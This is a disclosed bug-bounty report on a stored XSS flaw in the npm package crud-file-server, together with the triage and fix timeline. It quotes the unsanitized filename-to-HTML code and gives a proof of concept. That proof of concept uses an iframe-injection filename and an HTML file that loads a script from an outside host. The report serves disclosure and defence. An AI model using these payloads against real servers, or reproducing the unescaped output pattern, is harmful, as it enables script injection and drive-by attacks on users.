---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/node
  - vuln/xss-stored
  - vuln/xss
  - trigger/one-click
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2018-02-17
submitted: 2018-01-31T20:38:25.774Z
bounty_usd: null
votes: 4
cve: "CVE-2018-3726"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/311101"
title: "[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server"
---
# [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2018-02-17

- Report: [https://hackerone.com/reports/311101](https://hackerone.com/reports/311101)
- CWE: Cross-site Scripting (XSS) - Stored | CVE: CVE-2018-3726
- Submitted: 2018-01-31T20:38:25.774Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

## Module

**crud-file-server**

This package exposes a directory and its children to create, read, update, and delete operations over http.

https://www.npmjs.com/package/crud-file-server

version: 0.7.0

Stats
0 downloads in the last day
26 downloads in the last week
220 downloads in the last month

~2500 estimated downloads per year


## Description

This vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:

```javascript
// node_modules/crud-file-server/crud-file-server.js, line 137
    res.setHeader('Content-Type', 'text/html');											
    res.write('<html><body>');
    for(var f = 0; f < results.length; f++) {
        var name = results[f].name;
        var normalized = url + '/' + name;
        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }
        res.write('\r\n<p><a href="/' + normalized + '">' + name + '</a></p>');
    }
    res.end('\r\n</body></html>');
```
## PoC - Steps To Reproduce:

- install ```crud-file-server```

```
$ npm install crud-file-server
```


- in the directory which will be served via ```crud-file-server```, create file with following name:

```
"><iframe src="malware_frame.html">
```

- create second file with name ```malware_frame.html``` with following content and save it in the same directory:


```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

Run ```crud-file-server``` in directory with file with changed filename:

```
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080

usage:
  crud-file-server [options]

this starts a file server using the specified command-line options

options:

  -f file system path to expose over http
  -h log head requests
  -p port to listen on (example, 80)
  -q suppress this message
  -r read only
  -v virtual path to host the file server on

example:

  crud-file-server -f c:/ -p 8080 -q -v filez

listening on :8080/, serving ./
```

and open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:

{F259251}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.

## Timeline

- **Report Filed**
- **2018-01-31** @lirantal: Hi @bl4de 

Thanks a lot for reporting this to us.
A member of the team will look at your report and triage it shortly!
- **2018-02-02** @lirantal: Hi @bl4de,

Thanks for reporting this issue to us.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Triaged**
- **Report Severity Updated**
- **Changed Scope**
- **Cve Id Added**
- **2018-02-14** @lirantal: Since the author didn't join the report I opened a security issue in the repo.
- **External User Joined**
- **2018-02-15** @omphalos: @bl4de you mentioned there is another issue related to crud-file-server - I'm not sure how to find it on this site.  Can you point me to it please?
- **2018-02-15** @bl4de: @omphalos 

Sure, that's this report:

https://hackerone.com/reports/310690

But I believe to be able to see one, some of triage team has to invite you to join it (I can't do this as reporter).
- **2018-02-15** @omphalos: Thanks @bl4de!

@lirantal if there is a remaining issue with crud-file-server I will be happy to help with it.
- **2018-02-15** @lirantal: @omphalos thanks for jumping in!
I invited you to the other issue as well where you will collaborate on it with my colleague @vdeturckheim.
Goodluck and thank you for your pro-active attitude!

With regards to this issue, is there a fix added already that @bl4de can verify?
- **2018-02-16** @omphalos: @lirantal, @bl4de stated he verified the fix for this issue in the github thread.
- **2018-02-16** @bl4de: @lirantal - I can confirm issue is fixed and not reproducible anymore.

@omphalos - thanks for quick fixes, I am happy I was able to help :)
- **2018-02-16** @lirantal: Oh great, awesome work!

Are you guys ok if I go ahead and fully public disclose the report now?
- **2018-02-16** @bl4de: @lirantal Yep, I'm fine, as always :)
- **2018-02-16** @lirantal: @omphalos ?
- **2018-02-16** @omphalos: @lirantal yes that would be great, thank you.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
